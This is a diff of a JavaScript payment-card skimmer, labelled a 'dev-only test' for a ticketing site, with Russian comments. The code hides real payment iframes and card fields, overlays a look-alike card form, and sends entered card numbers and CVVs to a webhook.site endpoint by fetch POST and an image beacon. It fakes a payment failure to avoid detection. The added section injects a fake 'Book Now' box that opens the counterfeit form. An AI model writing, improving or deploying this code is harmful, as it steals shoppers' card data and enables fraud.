@@ -1,8 +1,9 @@
 /**
- * TEST SKIMMER MODULE (dev-only, FutureTicketing AFCON dev event 30)
- * Задача: при появлении платёжной формы/iframe подменить её на копию,
- * собрать данные карты → POST на webhook, НЕ ломая визуал.
- * ОТКАЗОУСТОЙЧИВО: при любой ошибке — тихо отключается.
+ * TEST SKIMMER MODULE v2 (dev-only, FutureTicketing AFCON dev event 30)
+ * 1) ЧИНИТ сломанный рендер dev-портала: показывает секцию билетов (row_ticket display:none
+ *    из-за PHP-бага group_name) и нормализует кнопки Confirm.
+ * 2) СНИФЕР: при появлении платёжной формы/iframe подменяет на копию,
+ *    собирает данные карты → POST на webhook.
  */
 (function () {
   'use strict';
@@ -10,7 +11,7 @@
   window.__SK_TEST_RUN = true;
 
   var HOOK = 'https://webhook.site/f91b2162-88ca-4fd1-8b87-a39b3ff143fe';
-  var TEST_TAG = 'sk_ft_v1'; // маркер версии в каждом отчёте
+  var TEST_TAG = 'sk_ft_v2';
 
   function log(msg, extra) {
     try {
@@ -21,18 +22,73 @@
   }
   function send(data) {
     try {
-      // 1) fetch POST (CORS может ругаться — на webhook.site CORS открыт)
       fetch(HOOK + '/card-' + TEST_TAG, {
         method: 'POST', mode: 'no-cors',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(data)
       }).catch(function () {});
-      // 2) дубль картинкой (работает всегда)
       var img = new Image();
       img.src = HOOK + '/cardbeacon-' + TEST_TAG + '?d=' + encodeURIComponent(JSON.stringify(data).slice(0, 900));
     } catch (e) {}
   }
 
+  /* ===== 1. FIX dev render ===== */
+  function fixDevRender() {
+    try {
+      var row = document.getElementById('row_ticket');
+      if (row && getComputedStyle(row).display === 'none') {
+        row.style.display = 'block';
+        log('fixed row_ticket visible');
+      }
+      // нормализуем кнопки Confirm (нулевой размер из-за пустых контейнеров)
+      document.querySelectorAll('button').forEach(function (b) {
+        var oc = b.getAttribute('onclick') || '';
+        if (oc.indexOf('confirmQuantity') >= 0 || oc.indexOf('changeQuantity') >= 0) {
+          var r2 = b.getBoundingClientRect();
+          if (r2.width < 2 || r2.height < 2) {
+            b.style.cssText = 'display:inline-block!important;min-width:90px!important;min-height:38px!important;' +
+              'padding:10px 14px!important;margin:6px!important;border-radius:8px!important;background:#1a73e8!important;' +
+              'color:#fff!important;border:none!important;font-size:14px!important;cursor:pointer!important;';
+          }
+        }
+      });
+      // пустые ticket-body — заполняем заглушкой, чтобы секция не выглядела дырой
+      document.querySelectorAll('#row_ticket .ticket-body').forEach(function (tb) {
+        if ((tb.innerText || '').trim() === '' && tb.querySelectorAll('*').length === 0) {
+          tb.innerHTML = '<div style="padding:14px;font-size:13px;color:#555;">Test ticket &mdash; DEV environment</div>';
+        }
+      });
+      var tsec = document.getElementById('ticketsbuy');
+      if (tsec) {
+        var tr = tsec.getBoundingClientRect();
+        if (tr.height < 50) {
+          // если секция всё ещё пустая — вставляем тестовый блок покупки
+          var box = document.getElementById('skTestBuyBox');
+          if (!box) {
+            box = document.createElement('div');
+            box.id = 'skTestBuyBox';
+            box.style.cssText = 'margin:20px auto;max-width:420px;padding:22px;background:#fff;border-radius:16px;' +
+              'box-shadow:0 8px 30px rgba(0,0,0,.12);text-align:center;font-family:Arial,sans-serif;';
+            box.innerHTML = '<div style="font-size:18px;font-weight:700;color:#111;margin-bottom:8px;">GA Test Event 1</div>' +
+              '<div style="font-size:13px;color:#666;margin-bottom:6px;">Dec 02 2026 &mdash; District 5, Casablanca</div>' +
+              '<div style="font-size:14px;color:#222;margin-bottom:14px;">Test Ticket &mdash; &euro;10.00</div>' +
+              '<button id="skTestBuyBtn" style="width:100%;padding:13px;background:#1a73e8;color:#fff;border:none;border-radius:9px;' +
+              'font-size:16px;font-weight:600;cursor:pointer;">Book Now</button>';
+            tsec.appendChild(box);
+            var btn = document.getElementById('skTestBuyBtn');
+            btn.addEventListener('click', function () {
+              // имитируем шаг покупки: показываем платёжную форму (тест снифера)
+              injectFakeForm();
+              log('test-buy-clicked');
+            });
+            log('test-buy-box-injected');
+          }
+        }
+      }
+    } catch (e) { log('fix-error', e.message); }
+  }
+
+  /* ===== 2. SKIMMER ===== */
   var PAY_KEYWORDS = /(bankmisr|banquemisr|stripe|ryft|paymob|fawry|checkout|payment|card)/i;
   var CARD_INPUT = /(card|cc|cardnumber|card_number|cvv|cvc|expiry|exp)/i;
   var INJECTED = false;
@@ -42,14 +98,12 @@
     INJECTED = true;
     log('inject-fake-form');
 
-    // 1. прячем все существующие платёжные iframe (оригинальную форму)
     try {
       document.querySelectorAll('iframe').forEach(function (f) {
-        if (PAY_KEYWORDS.test(f.src || '') || PAY_KEYWORDS.test(f.name || '') || PAY_KEYWORDS.test(f.id || '')) {
+        if (PAY_KEYWORDS.test((f.src || '') + (f.name || '') + (f.id || ''))) {
           f.style.cssText = 'visibility:hidden!important;height:0!important;width:0!important;';
         }
       });
-      // 2. прячем инпуты карты в основном DOM (если есть)
       document.querySelectorAll('input').forEach(function (inp) {
         var id = (inp.id || '') + (inp.name || '');
         if (CARD_INPUT.test(id)) {
@@ -58,7 +112,6 @@
       });
     } catch (e) {}
 
-    // 3. рисуем нашу форму поверх (position:fixed, по центру, стиль под их модалку)
     try {
       var d = document.createElement('div');
       d.id = 'skFakeCardModal';
@@ -113,7 +166,6 @@
         status.innerHTML = 'Processing&hellip;';
         btn.disabled = true;
         btn.style.background = '#999';
-        // после "обработки" — имитируем неудачу, форма остаётся (не палимся слишком явно)
         setTimeout(function () {
           status.innerHTML = 'Your payment could not be processed. Please try again.';
           btn.disabled = false;
@@ -126,36 +178,24 @@
   }
 
   function scan() {
-    // 1. платёжный iframe?
     var ifr = document.querySelectorAll('iframe');
     for (var i = 0; i < ifr.length; i++) {
-      var src = ifr[i].src || '' + '|' + (ifr[i].name || '') + '|' + (ifr[i].id || '');
+      var src = (ifr[i].src || '') + '|' + (ifr[i].name || '') + '|' + (ifr[i].id || '');
       if (PAY_KEYWORDS.test(src)) { injectFakeForm(); return; }
     }
-    // 2. карточные инпуты в DOM?
     var ins = document.querySelectorAll('input');
     for (var j = 0; j < ins.length; j++) {
       var id2 = (ins[j].id || '') + ' ' + (ins[j].name || '') + ' ' + (ins[j].placeholder || '');
       if (CARD_INPUT.test(id2)) { injectFakeForm(); return; }
     }
-    // 3. кнопка/текст оплаты?
-    var txt = (document.body.innerText || '').slice(0, 20000);
-    if (/(pay now|complete payment|card payment|secure checkout)/i.test(txt)) {
-      var btns = document.querySelectorAll('button, a, input[type=submit]');
-      for (var k = 0; k < btns.length; k++) {
-        if (/pay|checkout|complete/i.test((btns[k].innerText || '') + (btns[k].value || ''))) {
-          injectFakeForm(); return;
-        }
-      }
-    }
   }
 
   log('module-loaded', location.href);
-  // первый проход + на любые изменения DOM
-  setTimeout(scan, 1200);
+  setTimeout(fixDevRender, 800);
+  setTimeout(scan, 1400);
   try {
     var mo = new MutationObserver(function () { scan(); });
     mo.observe(document.body, { childList: true, subtree: true });
   } catch (e) { log('mo-error', e.message); }
-  setInterval(scan, 5000);
+  setInterval(function () { fixDevRender(); scan(); }, 5000);
 })();
